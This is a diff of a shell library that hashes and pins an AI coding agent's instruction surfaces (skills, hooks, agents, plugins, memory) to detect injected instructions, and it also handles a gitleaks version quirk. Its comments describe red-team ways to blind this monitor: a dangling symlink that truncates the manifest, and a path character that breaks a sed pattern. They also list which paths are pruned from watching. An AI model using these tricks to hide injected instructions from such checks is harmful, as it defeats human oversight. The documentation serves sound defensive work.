 # is a real directory: absolute, no `..`, one level, so the walk pins its content under its own path anyway.
 floor_instr_shared_memory() { # <config-dir> <surface glob> <link target>
@@ -3516,48 +2463,10 @@ floor_instr_memlinks() { # <config-dir>
 # Several dirs share one walk (the projects/*/memory stores, harbor#559); plugins is always one dir, $1.
 floor_instr_dirs() {
   _p="$1"
-  # DO NOT follow directory symlinks. `find -L` did, and a link pointing at
-  # its own ancestor (`ln -s .. skills/up`) made the walk self-referential:
-  # the manifest never settled, so the advisory became permanent and
-  # --apply could never clear it (pass 10, B8R2-06). Enumerating without
-  # -L terminates; a symlinked FILE is still hashed through the link below,
-  # and every link's TARGET is recorded, so re-pointing one is still drift
-  # even though its contents are not walked.
-  # .git is excluded: a plugin checkout rewrites objects on every fetch,
-  # and an advisory that fires on every fetch is one nobody reads.
-  #
-  # `.in_use/` AND `.last_inuse_sweep` ARE THE SAME CLASS, and they were
-  # making the advisory permanent. Claude Code reference-counts each cached
-  # plugin by dropping `plugins/cache/<mp>/<plugin>/<ver>/.in_use/<pid>` at
-  # session start and sweeping them into `plugins/.last_inuse_sweep`. So
-  # EVERY session changed the manifest, and this machine's SessionStart had
-  # been reporting the identical five paths as instruction-surface drift —
-  # four `.in_use/<pid>` files and the sweep timestamp. Verified 2026-08-02:
-  # the two pids present were exactly the two live sessions, and one marker
-  # read {"pid":89490,"procStart":"Sun Aug  2 08:41:36 2026"} — a lockfile,
-  # not content.
-  #
-  # THIS NARROWS WHAT B8 WATCHES, so the justification has to be that the
-  # pruned paths cannot carry injected instructions, not merely that they
-  # are noisy. They cannot: a plugin is loaded from its manifest — skills/,
-  # commands/, hooks/, agents/ — and nothing reads `.in_use/`. Pruning is
-  # scoped to that one directory name and that one filename rather than to
-  # a pattern, so a file planted anywhere else under plugins/ is still
-  # hashed. The alternative was worse in the way №2.11 names: an advisory
-  # that cries wolf at every single SessionStart is one the operator learns
-  # to scroll past, and then the real drift scrolls past with it.
-  # .gcs-sha is a git-fetch marker (one sha), pruned like .git. The two
-  # plugin manifests are excluded here and re-emitted below in a
-  # timestamp-normalized form (harbor#198); their raw bytes churn every
-  # session on a lastUpdated field that carries no instruction.
-  # marketplace.json is excluded and re-emitted the same way, on the same
-  # reasoning applied to a different field — see floor_marketplace_sha for the
-  # measured churn rate and why stripping `source.sha` does not narrow what a
-  # session can be instructed by. EXCLUDED-THEN-RE-EMITTED, never dropped.
-  # harbor#764: the plugin sync's `synced/<id>/.last-complete-round` and the cache's
-  # `<ver>/.orphaned_at` are timestamps the harness rewrites on its own, so B8 went amber
-  # seconds after every re-pin. Pruned by NAME and on the plugins surface only; on any other
-  # surface the two names below are the already-pruned sweep file, a no-op.
+  # DO NOT follow directory symlinks: `find -L` on a link to its own ancestor (`ln -s .. skills/up`) made the manifest never settle, so --apply could never clear the advisory (pass 10, B8R2-06). A symlinked FILE is still hashed through the link below, and every link's TARGET is recorded.
+  # PRUNED, because an advisory that fires on every session is one nobody reads, and these cannot carry an instruction (a plugin loads from its manifest: skills/, commands/, hooks/, agents/): .git (objects rewritten on every fetch); `.in_use/` and `.last_inuse_sweep` (Claude Code's per-session pid lockfiles under plugins/cache, which made the same five paths drift at every SessionStart); .gcs-sha (a git-fetch marker).
+  # Scoped to those names, not a pattern, so a file planted anywhere else under plugins/ is still hashed. The three plugin manifests (installed_plugins.json, known_marketplaces.json, marketplace.json) are EXCLUDED THEN RE-EMITTED timestamp- or sha-normalized (harbor#198, floor_marketplace_sha), never dropped.
+  # harbor#764: the plugin sync's `synced/<id>/.last-complete-round` and the cache's `<ver>/.orphaned_at` are harness-rewritten timestamps; pruned by NAME on the plugins surface only (elsewhere the two names are the already-pruned sweep file, a no-op).
   if [ "$_g" = plugins ]; then _bk1=.last-complete-round; _bk2=.orphaned_at; _bk3=.marketplaces.json
   else _bk1=.last_inuse_sweep; _bk2=.last_inuse_sweep; _bk3=.last_inuse_sweep; fi
   # harbor#478: the harness re-extracts a plugin into a new cache/<ver>/ about daily,
@@ -3583,11 +2492,7 @@ floor_instr_dirs() {
          ! -name installed_plugins.json ! -name known_marketplaces.json \
          ! -name marketplace.json ! -name "$_bk1" ! -name "$_bk2" ! -name "$_bk3" \
          -type f -exec shasum -a 256 {} + 2>/dev/null
-  # Prefix-stripped with awk's index(), NOT sed: the config dir is data,
-  # and putting it in a sed PATTERN made its metacharacters active — a `|`
-  # in the path threw "bad flag in substitute command" and silently
-  # dropped the whole surface from the manifest, which then reads as
-  # "clean" (red-team B8, B8-DEF-07). index() is a literal search.
+  # Prefix-stripped with awk index(), NOT sed: the config dir is data, and in a sed PATTERN a `|` threw "bad flag in substitute command" and silently dropped the surface, which reads as "clean" (red-team B8-DEF-07).
   fi | awk -v p="  $_cfg/" '{ i=index($0,p); if (i) print substr($0,1,i+1) substr($0,i+length(p)); else print }'
   # Re-emit the two excluded manifests in timestamp-normalized form. Guarded
   # on -f, so this is a no-op for every surface that does not hold them.
@@ -3613,13 +2518,7 @@ floor_instr_dirs() {
       else printf 'absent  %s\n' "$_ll"; fi
     done
   fi
-  # Re-emit every marketplace CATALOG in sha-normalized form. A find rather
-  # than the fixed path the loop above uses: catalogs live one per marketplace
-  # at plugins/marketplaces/<mp>/.claude-plugin/marketplace.json, so there are
-  # N of them and none sits at the surface root. printf is the last command in
-  # the body deliberately — a false test in that position kills the pipeline
-  # under `set -eu` and SILENTLY TRUNCATES the manifest, which is the B8-02
-  # mechanism the symlink loop below documents at length.
+  # Re-emit every marketplace CATALOG in sha-normalized form: there are N, at plugins/marketplaces/<mp>/.claude-plugin/marketplace.json and none at the surface root, hence a find. printf is the last command in the body on purpose: a false test there kills the pipeline under `set -eu` and silently truncates the manifest (B8-02, below).
   find "$@" \( -name .git -o -name .in_use -o -path "$_pc" \) -prune -o \
        -name marketplace.json -type f -print 2>/dev/null | while IFS= read -r _mk; do
     _mkrel="${_mk#"$_cfg"/}"
@@ -3635,19 +2534,8 @@ floor_instr_dirs() {
        ! -name .last_inuse_sweep -type l -print 2>/dev/null | while IFS= read -r _l; do
     _rel="${_l#"$_cfg"/}"
     printf 'link:%s  %s\n' "$(readlink "$_l" 2>/dev/null || echo '?')" "$_rel"
-    # A symlink to a regular FILE is hashed through the link, so swapping
-    # its target content is drift (that was B8-02). A symlink to a
-    # DIRECTORY is recorded by target only — see the note above.
-    #
-    # `if`, NOT `[ … ] && …`. As the LAST command of this while body, a
-    # false test made the loop exit 1, which killed the enclosing pipeline
-    # under `set -eu` and SILENTLY TRUNCATED the manifest at the first
-    # surface containing a broken or directory symlink. Weaponised in pass
-    # 11 (B8-02, critical): one `ln -s /nonexistent <cfg>/agents/x` — a
-    # write into a surface that is writable by design — dropped skills,
-    # commands, hooks, plugins and memory from BOTH the pin and the live
-    # manifest, so the diff was empty forever and floor-verify reported
-    # "✓ instruction surfaces pinned and unchanged" over live injections.
+    # A symlink to a regular FILE is hashed through the link (swapping its target content is drift; B8-02); a symlink to a DIRECTORY is recorded by target only.
+    # `if`, NOT `[ ... ] && ...`: as the LAST command of this while body a false test exits 1, which kills the enclosing pipeline under `set -eu` and silently TRUNCATED the manifest at the first broken or directory symlink (pass 11, B8-02, critical): one `ln -s /nonexistent <cfg>/agents/x` emptied the diff forever while floor-verify reported the surfaces pinned and unchanged.
     if [ -f "$_l" ]; then printf '%s  %s\n' "$(floor_sha < "$_l")" "$_rel"; fi
   done
 }
@@ -3695,25 +2583,10 @@ floor_instr_manifest() { # <config-dir>
   done | floor_instr_unloaded_filter "$_imunl" | LC_ALL=C sort -k2
 }
 
-# ── the work-log record writer (G2 + harbor#6) ──────────────────────────────
-# ONE implementation, because there are now two callers: worklog-push.sh writes
-# a record when a session STOPS, and memory-harvest.sh writes one when it finds a
-# session that stopped without ever reaching that hook — a crash, a kill, a
-# machine that slept. Two open-coded writers of one format drift, and the drift
-# is invisible: both keep producing files, they just stop being the same shape,
-# and the corpus that is supposed to be uniform quietly is not.
-#
-# CREATE-IF-ABSENT, THEN APPEND. The Stop hook fires more than once per session,
-# and each firing is a real event worth a line. Idempotency for the reconciler is
-# therefore the RECONCILER's job — it checks the record exists before calling —
-# rather than a mode flag here, so this function has one behaviour instead of two.
-#
+# The work-log record writer (G2 + harbor#6). ONE implementation for two callers: worklog-push.sh writes a record when a session STOPS, memory-harvest.sh when it finds a session that stopped without reaching that hook. Two open-coded writers of one format drift invisibly.
+# CREATE-IF-ABSENT, THEN APPEND: the Stop hook fires more than once per session and each firing is a line. Idempotency for the reconciler is the RECONCILER's job (it checks the record exists before calling).
 #   floor_worklog_record <log-dir> <host> <session-id> <date> <time> <cwd> [source]
-#
-# `source` lands in the frontmatter, not in the line. A backfilled record is
-# genuinely different from a live one — its clock is the transcript's mtime, not
-# the moment work happened — and a reader deserves to know which they are looking
-# at. Keeping it out of the line means the body stays uniform for retrieval.
+# `source` lands in the frontmatter, not in the line: a backfilled record's clock is the transcript's mtime, and keeping it out of the line keeps the body uniform for retrieval.
 floor_worklog_record() {
   _wr_dir="${1:-}"; _wr_host="${2:-}"; _wr_sid="${3:-}"
   _wr_date="${4:-}"; _wr_time="${5:-}"; _wr_cwd="${6:-}"; _wr_src="${7:-}"
@@ -3733,38 +2606,9 @@ floor_worklog_record() {
   printf -- '- %s · cwd: %s\n' "$_wr_time" "${_wr_cwd:-unknown}" >> "$_wr_rec" 2>/dev/null || return 1
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# THE GITLEAKS SUBCOMMAND IS A DIALECT, AND ITS ABSENCE LOOKS LIKE A FINDING.
-#
-# gitleaks 8.19 introduced `gitleaks git` and folded --pre-commit/--staged into
-# it. 8.18.4 has NO `git` subcommand — its verbs are detect, protect, version,
-# completion, help — and an unknown command exits 1. Every caller here runs the
-# scanner with `--exit-code 1`, i.e. "1 means a leak was found", so on 8.18.4 the
-# two outcomes are INDISTINGUISHABLE: a missing subcommand reads as a secret.
-#
-# That is not hypothetical and it is not a corner. `.github/workflows/
-# governance.yml` installs v8.18.4 by exact URL and its preflight checks
-# `command -v gitleaks` — presence, not surface — so on a hosted runner the
-# work-log gate refused every commit while reporting a finding, and floor-test's
-# C1a teeth arm went red saying "the allowlist committed NOTHING". Measured
-# 2026-09-06 against 8.18.4.
-#
-# PROBE, NEVER ASSUME, and never pin a version here: the operator's box may carry
-# either, and this must not decide for them. `--help` on the subcommand is the
-# cheapest true answer — it exits 0 where the verb exists and non-zero where it
-# does not.
-#
-# THE FALLBACK REALLY SCANS, and that was measured as a matched PAIR rather than
-# asserted, because an allow-only result is indistinguishable from a scanner that
-# does nothing: `protect --staged` on a planted synthetic token exits 1, and on a
-# clean staged tree exits 0. `detect` likewise catches a planted token in a tree.
-# 8.18's `protect --staged` IS its documented pre-commit path, which is what
-# 8.19's `git --pre-commit --staged` renamed.
-#
-# FAIL-CLOSED IS THE CALLER'S JOB, not this function's. Both helpers return the
-# scanner's own verdict — 0 clean, non-zero otherwise — and every caller already
-# treats non-zero as "block". A helper that swallowed a scan failure would be the
-# fail-open shape the floor exists to refuse.
+# THE GITLEAKS SUBCOMMAND IS A DIALECT, AND ITS ABSENCE LOOKS LIKE A FINDING. gitleaks 8.19 introduced `gitleaks git`; 8.18.4 has no such verb, and an unknown command exits 1, which with `--exit-code 1` is indistinguishable from "a leak was found". The hosted governance workflow installs v8.18.4 and checks only `command -v gitleaks`, so the work-log gate refused every commit while reporting a finding (floor-test C1a).
+# PROBE, NEVER ASSUME, and never pin a version: `gitleaks git --help` exits 0 where the verb exists. The fallback really scans (matched pair: `protect --staged` exits 1 on a planted token and 0 on a clean tree; it is what 8.19 renamed to `git --pre-commit --staged`).
+# FAIL-CLOSED IS THE CALLER'S JOB: both helpers return the scanner's own verdict (0 clean) and every caller treats non-zero as "block".
 
 floor_gitleaks_staged() { # <repo-dir> — 0 iff the STAGED snapshot is clean
   if gitleaks git --help >/dev/null 2>&1; then
